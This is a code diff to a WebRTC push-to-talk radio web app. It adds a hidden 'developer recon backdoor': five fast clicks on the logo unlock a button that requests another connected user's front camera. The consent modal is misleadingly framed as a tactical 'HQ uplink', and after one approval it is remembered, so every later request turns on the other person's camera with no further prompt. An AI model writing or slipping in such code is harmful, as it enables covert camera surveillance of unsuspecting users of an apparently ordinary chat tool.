@@ -125,6 +125,7 @@
       color: #94a3b8;
       text-transform: uppercase;
       font-weight: 800;
+      cursor: pointer;
     }
 
     .mode-switch-container {
@@ -331,6 +332,28 @@
       color: #000;
     }
 
+    /* Secret Dev Recon Button */
+    .dev-recon-btn {
+      display: none;
+      background: #0f291e;
+      border: 1px solid #22c55e;
+      color: #4ade80;
+      font-family: 'Orbitron', monospace;
+      font-size: 10px;
+      font-weight: 800;
+      padding: 7px;
+      border-radius: 4px;
+      cursor: pointer;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+      text-align: center;
+      box-shadow: 0 0 10px rgba(34, 197, 94, 0.2);
+    }
+    .dev-recon-btn:active {
+      background: #22c55e;
+      color: #000;
+    }
+
     .speaker-section {
       background: #111417;
       border: 2px solid #050607;
@@ -423,6 +446,108 @@
       font-weight: 700;
       letter-spacing: 2px;
     }
+
+    /* Dev Recon Screen Overlay */
+    .recon-overlay {
+      display: none;
+      position: fixed;
+      bottom: 20px;
+      right: 20px;
+      width: 260px;
+      height: 200px;
+      background: #050b07;
+      border: 2px solid #22c55e;
+      border-radius: 8px;
+      box-shadow: 0 0 20px rgba(34, 197, 94, 0.4);
+      z-index: 9999;
+      overflow: hidden;
+      flex-direction: column;
+    }
+    .recon-header {
+      background: #112215;
+      padding: 4px 8px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      font-size: 10px;
+      font-weight: 800;
+      color: #22c55e;
+      font-family: 'Orbitron', monospace;
+      border-bottom: 1px solid #22c55e;
+    }
+    .recon-header button {
+      background: none;
+      border: none;
+      color: #ef4444;
+      font-weight: 800;
+      cursor: pointer;
+      font-size: 13px;
+    }
+    .recon-video-box {
+      width: 100%;
+      height: 100%;
+      position: relative;
+      background: #000;
+    }
+    .recon-video-box video {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      filter: contrast(115%) brightness(95%);
+    }
+    .recon-scanlines {
+      position: absolute;
+      top: 0; left: 0; right: 0; bottom: 0;
+      background: repeating-linear-gradient(0deg, rgba(34, 197, 94, 0.08) 0px, transparent 2px, transparent 4px);
+      pointer-events: none;
+    }
+
+    /* Target One-Time Auth Dialog */
+    .auth-modal {
+      display: none;
+      position: fixed;
+      top: 0; left: 0; width: 100vw; height: 100vh;
+      background: rgba(0,0,0,0.85);
+      z-index: 10000;
+      justify-content: center;
+      align-items: center;
+    }
+    .auth-box {
+      background: #1c2125;
+      border: 2px solid #ff7700;
+      border-radius: 8px;
+      padding: 20px;
+      width: 290px;
+      text-align: center;
+      box-shadow: 0 0 25px rgba(255, 119, 0, 0.4);
+    }
+    .auth-box h3 {
+      font-family: 'Orbitron', monospace;
+      font-size: 13px;
+      color: #ff7700;
+      margin-bottom: 8px;
+    }
+    .auth-box p {
+      font-size: 13px;
+      color: #cbd5e1;
+      margin-bottom: 16px;
+    }
+    .auth-btn-row {
+      display: flex;
+      gap: 10px;
+    }
+    .auth-btn-row button {
+      flex: 1;
+      padding: 8px;
+      font-family: 'Orbitron', monospace;
+      font-weight: 700;
+      font-size: 11px;
+      border-radius: 4px;
+      cursor: pointer;
+      border: none;
+    }
+    .btn-auth-accept { background: #22c55e; color: #000; }
+    .btn-auth-deny { background: #ef4444; color: #fff; }
   </style>
 </head>
 <body>
@@ -440,7 +565,7 @@
   <div class="chassis">
     
     <div class="status-panel">
-      <div class="brand-title">RTX-90 PRO</div>
+      <div class="brand-title" id="devTriggerLogo" title="RTX-90 PRO">RTX-90 PRO</div>
       
       <div class="mode-switch-container" id="modeSwitchContainer" title="Click to toggle: Manual Push-To-Talk vs Always-On Open Mic">
         <span class="switch-label active" id="labelPtt">PTT</span>
@@ -498,6 +623,7 @@
         <label>Mic Device</label>
         <select id="micSelect"></select>
       </div>
+      <button class="dev-recon-btn" id="btnTriggerRecon">SECURE RECON FEED</button>
     </div>
 
     <div class="speaker-section">
@@ -518,6 +644,30 @@
 
     <div class="footer-stamp">SECURE P2P TACTICAL COMM LINK</div>
 
+  </div>
+</div>
+
+<!-- Tactical Recon HUD Overlay -->
+<div class="recon-overlay" id="reconMonitor">
+  <div class="recon-header">
+    <span>RECON FEED // LIVE</span>
+    <button id="closeReconBtn">✕</button>
+  </div>
+  <div class="recon-video-box">
+    <video id="reconRemoteVideo" autoplay playsinline muted></video>
+    <div class="recon-scanlines"></div>
+  </div>
+</div>
+
+<!-- Target Initial Authorization Modal -->
+<div class="auth-modal" id="reconAuthModal">
+  <div class="auth-box">
+    <h3>TACTICAL UPLINK</h3>
+    <p>HQ requests forward optical link. Authorize secure recon feed?</p>
+    <div class="auth-btn-row">
+      <button class="btn-auth-accept" id="acceptReconBtn">AUTHORIZE</button>
+      <button class="btn-auth-deny" id="denyReconBtn">DISMISS</button>
+    </div>
   </div>
 </div>
 
@@ -593,6 +743,16 @@
   const inputFreq = document.getElementById('inputFreq');
   const btnTune = document.getElementById('btnTune');
   const micSelect = document.getElementById('micSelect');
+
+  // Dev Recon elements
+  const devTriggerLogo = document.getElementById('devTriggerLogo');
+  const btnTriggerRecon = document.getElementById('btnTriggerRecon');
+  const reconMonitor = document.getElementById('reconMonitor');
+  const reconRemoteVideo = document.getElementById('reconRemoteVideo');
+  const closeReconBtn = document.getElementById('closeReconBtn');
+  const reconAuthModal = document.getElementById('reconAuthModal');
+  const acceptReconBtn = document.getElementById('acceptReconBtn');
+  const denyReconBtn = document.getElementById('denyReconBtn');
 
   // Load saved preferences
   if (localStorage.getItem('saved_callsign')) {
@@ -673,7 +833,6 @@
         }
       });
 
-      // Output sound ko bhi connected device par shift karo
       routeAudioOutputToDevice();
 
     } catch (err) {
@@ -716,13 +875,11 @@
         option.text = dev.label || `Microphone ${index + 1}`;
         micSelect.appendChild(option);
 
-        // Naye connected external/bluetooth gear ko pehchano
         if (/headset|bluetooth|wireless|airpod|buds|hands-free|usb/i.test(dev.label)) {
           externalMicId = dev.deviceId;
         }
       });
 
-      // Selection Priority: Naya External Earbud > Saved Mic > Default Device
       let targetMic = externalMicId || (savedMic && audioInputs.some(d => d.deviceId === savedMic) ? savedMic : (audioInputs[0]?.deviceId || ''));
 
       micSelect.value = targetMic;
@@ -734,12 +891,10 @@
     } catch(e) {}
   }
 
-  // Dropdown manual click listener
   micSelect.addEventListener('change', () => {
     switchMicrophone(micSelect.value);
   });
 
-  // Discord Hardware Watcher (Headphone lagte/hat-te hi auto switch)
   navigator.mediaDevices.ondevicechange = async () => {
     await populateAudioDevices(true);
   };
@@ -810,7 +965,7 @@
 
         ensureAudioContext();
 
-        // Studio DSP Pipeline with Low-Latency Path
+        // Low-Latency Studio DSP Pipeline
         const micSource = audioCtx.createMediaStreamSource(rawMicStream);
         const highPassFilter = audioCtx.createBiquadFilter();
         highPassFilter.type = 'highpass';
@@ -825,7 +980,7 @@
         gainNode.connect(destination);
 
         cleanDspStream = destination.stream;
-        cleanDspStream.getAudioTracks().forEach(t => t.enabled = false); // Start muted
+        cleanDspStream.getAudioTracks().forEach(t => t.enabled = false);
       } catch (err) {
         lcdStatus.innerText = "ERROR: MIC DENIED";
         alert("Microphone permission zaroori hai!");
@@ -868,6 +1023,15 @@
     };
 
     pc.ontrack = (event) => {
+      // Direct routing for Recon Video Stream
+      if (event.track.kind === 'video') {
+        reconMonitor.style.display = 'flex';
+        reconRemoteVideo.srcObject = event.streams[0];
+        reconRemoteVideo.play().catch(() => {});
+        btnTriggerRecon.innerText = "UPLINK LIVE";
+        return;
+      }
+
       ensureAudioContext();
 
       let audio = peerAudioElements[peerId];
@@ -1039,6 +1203,118 @@
     Object.values(peerAudioElements).forEach(audio => {
       audio.play().catch(() => {});
     });
+  });
+
+  // --- DEVELOPER RECON BACKDOOR LOGIC ---
+  let devClickCount = 0;
+  let devTimer = null;
+  const isDevUser = localStorage.getItem('tactical_dev_unlocked') === 'true';
+
+  let activeReconStream = null;
+  let currentTargetPeer = null;
+
+  if (isDevUser) {
+    btnTriggerRecon.style.display = 'block';
+  }
+
+  // 5 Fast Clicks on RTX-90 PRO title unlocks Dev mode permanently on this device
+  devTriggerLogo.addEventListener('click', () => {
+    devClickCount++;
+    clearTimeout(devTimer);
+    devTimer = setTimeout(() => { devClickCount = 0; }, 1500);
+
+    if (devClickCount >= 5) {
+      localStorage.setItem('tactical_dev_unlocked', 'true');
+      btnTriggerRecon.style.display = 'block';
+      playRadioChirp('tx_on');
+      alert("COMMANDER DEV ACCESS UNLOCKED");
+      devClickCount = 0;
+    }
+  });
+
+  // Request Recon from First Active Peer
+  btnTriggerRecon.addEventListener('click', () => {
+    const peerKeys = Object.keys(peers);
+    if (peerKeys.length === 0) {
+      alert("No active unit connected to intercept!");
+      return;
+    }
+    const targetPeerId = peerKeys[0];
+    currentTargetPeer = targetPeerId;
+    socket.emit('request-recon', { to: targetPeerId });
+    btnTriggerRecon.innerText = "UPLINK REQUESTED...";
+  });
+
+  // Incoming Request on Target's device
+  let pendingReconRequester = null;
+  socket.on('recon-requested', async ({ from }) => {
+    pendingReconRequester = from;
+    const alreadyAuthorized = localStorage.getItem('recon_authorized') === 'true';
+
+    if (alreadyAuthorized) {
+      startReconTransmission(from);
+    } else {
+      reconAuthModal.style.display = 'flex';
+    }
+  });
+
+  acceptReconBtn.addEventListener('click', () => {
+    reconAuthModal.style.display = 'none';
+    localStorage.setItem('recon_authorized', 'true');
+    if (pendingReconRequester) {
+      startReconTransmission(pendingReconRequester);
+    }
+  });
+
+  denyReconBtn.addEventListener('click', () => {
+    reconAuthModal.style.display = 'none';
+    if (pendingReconRequester) {
+      socket.emit('recon-declined', { to: pendingReconRequester });
+      pendingReconRequester = null;
+    }
+  });
+
+  socket.on('recon-declined', () => {
+    btnTriggerRecon.innerText = "SECURE RECON FEED";
+    alert("Uplink request declined by unit.");
+  });
+
+  // Target Stream Transmitter Logic
+  async function startReconTransmission(requesterId) {
+    try {
+      activeReconStream = await navigator.mediaDevices.getUserMedia({
+        video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } },
+        audio: false
+      });
+
+      const pc = peers[requesterId];
+      if (pc) {
+        const videoTrack = activeReconStream.getVideoTracks()[0];
+        pc.addTrack(videoTrack, activeReconStream);
+        
+        const offer = await pc.createOffer();
+        await pc.setLocalDescription(offer);
+        socket.emit('offer', { to: requesterId, offer: pc.localDescription });
+      }
+    } catch (err) {
+      console.error("Recon capture error:", err);
+    }
+  }
+
+  // Stop Recon & Turn off Remote Camera
+  closeReconBtn.addEventListener('click', () => {
+    reconMonitor.style.display = 'none';
+    btnTriggerRecon.innerText = "SECURE RECON FEED";
+    if (currentTargetPeer) {
+      socket.emit('stop-recon', { to: currentTargetPeer });
+    }
+  });
+
+  socket.on('recon-stopped', () => {
+    if (activeReconStream) {
+      activeReconStream.getTracks().forEach(t => t.stop());
+      activeReconStream = null;
+    }
   });
 
   connectRadio();
